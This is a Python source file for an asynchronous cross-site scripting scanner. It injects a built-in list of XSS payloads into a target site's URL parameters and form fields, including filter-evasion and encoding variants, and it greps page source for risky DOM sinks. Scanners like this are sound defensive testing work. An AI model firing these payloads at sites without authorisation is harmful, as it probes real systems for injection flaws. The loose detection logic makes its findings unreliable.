import aiohttp
import asyncio
import re
from urllib.parse import urlparse, parse_qs, urlencode
import logging
from bs4 import BeautifulSoup

logger = logging.getLogger(__name__)

class XSSScanner:
    def __init__(self):
        self.payloads = [
            # Basic XSS payloads
            "<script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            
            # Event handler payloads
            "<img src=x onerror=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            
            # JavaScript URI payloads
            "javascript:alert('XSS')",
            "jav&#x09;ascript:alert('XSS')",
            "jav&#x0A;ascript:alert('XSS')",
            "jav&#x0D;ascript:alert('XSS')",
            
            # Encoding variations
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            
            # Advanced payloads
            "<img src=\"x\" `<script>alert('XSS')</script>`\">",
            "<a href=\"javascript:alert('XSS')\">Click</a>",
            "<div style=\"background:url(javascript:alert('XSS'))\">",
            "<table background=\"javascript:alert('XSS')\">",
            
            # DOM-based XSS
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "></script><script>alert('XSS')</script>",
            "\" onfocus=\"alert('XSS')\" autofocus=\"",
            "' onfocus='alert('XSS')' autofocus='"
        ]

    async def scan(self, url):
        """Comprehensive XSS scanning"""
        vulnerabilities = []
        
        try:
            # Test URL parameters
            url_vulns = await self._test_url_parameters(url)
            vulnerabilities.extend(url_vulns)
            
            # Test form parameters
            form_vulns = await self._test_form_parameters(url)
            vulnerabilities.extend(form_vulns)
            
            # Test DOM-based XSS
            dom_vulns = await self._test_dom_xss(url)
            vulnerabilities.extend(dom_vulns)
            
        except Exception as e:
            logger.error(f"XSS scan failed: {str(e)}")
        
        return vulnerabilities

    async def _test_url_parameters(self, url):
        """Test URL parameters for XSS"""
        vulnerabilities = []
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        for param in query_params:
            for payload in self.payloads:
                test_params = query_params.copy()
                test_params[param] = [payload]
                
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"
                
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(test_url, timeout=10) as response:
                            content = await response.text()
                            
                            if self._detect_xss_success(content, payload):
                                vulnerabilities.append({
                                    'title': 'Cross-Site Scripting (XSS) Vulnerability',
                                    'description': f'XSS detected in parameter: {param}',
                                    'severity': 'high',
                                    'evidence': {
                                        'parameter': param,
                                        'payload': payload,
                                        'url': test_url,
                                        'response_code': response.status
                                    },
                                    'recommendation': 'Implement proper input validation and output encoding',
                                    'cvss_score': 8.2
                                })
                                break
                                
                except Exception as e:
                    continue
        
        return vulnerabilities

    async def _test_form_parameters(self, url):
        """Test form parameters for XSS"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as response:
                    content = await response.text()
                    
                    # Extract forms from page
                    forms = self._extract_forms(content)
                    
                    for form in forms:
                        form_action = form.get('action', url)
                        form_method = form.get('method', 'get').lower()
                        form_inputs = form.get('inputs', {})
                        
                        for input_name in form_inputs:
                            for payload in self.payloads[:10]:  # Test with first 10 payloads
                                test_data = form_inputs.copy()
                                test_data[input_name] = payload
                                
                                try:
                                    if form_method == 'post':
                                        async with session.post(form_action, data=test_data, timeout=10) as form_response:
                                            form_content = await form_response.text()
                                            
                                            if self._detect_xss_success(form_content, payload):
                                                vulnerabilities.append({
                                                    'title': 'Cross-Site Scripting (XSS) Vulnerability (Form)',
                                                    'description': f'XSS detected in form parameter: {input_name}',
                                                    'severity': 'high',
                                                    'evidence': {
                                                        'parameter': input_name,
                                                        'payload': payload,
                                                        'form_action': form_action,
                                                        'method': form_method
                                                    },
                                                    'recommendation': 'Implement proper input validation and output encoding for all form inputs',
                                                    'cvss_score': 8.2
                                                })
                                                break
                                    else:
                                        # Handle GET forms
                                        query_string = urlencode(test_data)
                                        test_url = f"{form_action}?{query_string}"
                                        async with session.get(test_url, timeout=10) as form_response:
                                            form_content = await form_response.text()
                                            
                                            if self._detect_xss_success(form_content, payload):
                                                vulnerabilities.append({
                                                    'title': 'Cross-Site Scripting (XSS) Vulnerability (Form)',
                                                    'description': f'XSS detected in form parameter: {input_name}',
                                                    'severity': 'high',
                                                    'evidence': {
                                                        'parameter': input_name,
                                                        'payload': payload,
                                                        'url': test_url
                                                    },
                                                    'recommendation': 'Implement proper input validation and output encoding for all form inputs',
                                                    'cvss_score': 8.2
                                                })
                                                break
                                                
                                except Exception as e:
                                    continue
                                    
        except Exception as e:
            logger.error(f"Form testing failed: {str(e)}")
        
        return vulnerabilities

    async def _test_dom_xss(self, url):
        """Test for DOM-based XSS vulnerabilities"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as response:
                    content = await response.text()
                    
                    # Analyze JavaScript for DOM XSS patterns
                    dom_patterns = [
                        r"document\.write\(.*?\)",
                        r"innerHTML\s*=",
                        r"outerHTML\s*=",
                        r"eval\(.*?\)",
                        r"setTimeout\(.*?\)",
                        r"setInterval\(.*?\)",
                        r"location\.hash",
                        r"location\.search",
                        r"window\.name"
                    ]
                    
                    for pattern in dom_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            vulnerabilities.append({
                                'title': 'Potential DOM-based XSS Vulnerability',
                                'description': f'DOM XSS pattern detected: {pattern}',
                                'severity': 'medium',
                                'evidence': {
                                    'pattern': pattern,
                                    'context': 'JavaScript code analysis'
                                },
                                'recommendation': 'Avoid unsafe DOM manipulation and use safe alternatives',
                                'cvss_score': 6.1
                            })
        
        except Exception as e:
            logger.error(f"DOM XSS testing failed: {str(e)}")
        
        return vulnerabilities

    def _detect_xss_success(self, content, payload):
        """Detect if XSS payload was successful"""
        # Check if payload appears in response without encoding
        if payload in content:
            return True
        
        # Check for specific XSS indicators
        xss_indicators = [
            "<script>",
            "javascript:",
            "onerror=",
            "onload=",
            "onclick=",
            "alert("
        ]
        
        for indicator in xss_indicators:
            if indicator in content and any(p in payload for p in ['script', 'alert', 'onerror']):
                return True
        
        return False

    def _extract_forms(self, html_content):
        """Extract forms from HTML content"""
        forms = []
        
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'inputs': {}
                }
                
                # Extract input fields
                for input_tag in form.find_all('input'):
                    input_name = input_tag.get('name')
                    if input_name:
                        form_data['inputs'][input_name] = input_tag.get('value', '')
                
                # Extract textarea fields
                for textarea in form.find_all('textarea'):
                    textarea_name = textarea.get('name')
                    if textarea_name:
                        form_data['inputs'][textarea_name] = textarea.get_text()
                
                # Extract select fields
                for select in form.find_all('select'):
                    select_name = select.get('name')
                    if select_name:
                        first_option = select.find('option')
                        if first_option:
                            form_data['inputs'][select_name] = first_option.get('value', '')
                
                forms.append(form_data)
                
        except Exception as e:
            logger.error(f"Form extraction failed: {str(e)}")
        
        return forms

# Create scanner instance
scanner = XSSScanner()

# Async scan function
async def scan(url):
    return await scanner.scan(url)